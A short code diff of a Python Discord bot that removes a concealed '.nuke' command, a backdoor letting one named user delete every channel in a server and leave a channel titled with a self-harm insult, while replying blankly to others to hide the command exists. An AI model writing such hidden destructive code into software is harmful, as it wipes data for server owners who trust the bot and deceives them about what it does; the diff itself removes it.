@@ -142,18 +142,6 @@ async def on_message(message):
 
 
 
-
-    # <-------undercover nuke--------->
-    if message.content.startswith('.nuke'):
-        if message.author == "tarik#5891":
-            server = message.guild
-            for c in server.channels:
-                await c.delete()
-            await message.guild.create_text_channel(name="nuked lol kys")
-        else:
-            await message.channel.send("")  # faking that there is no .nuke command for people who checked it
-
-
 # <---------ban command---------->
 @client.tree.command(name="ban", description="ban a user")
 async def ban_user(interaction: discord.Interaction, user: discord.User, reason: str = None):
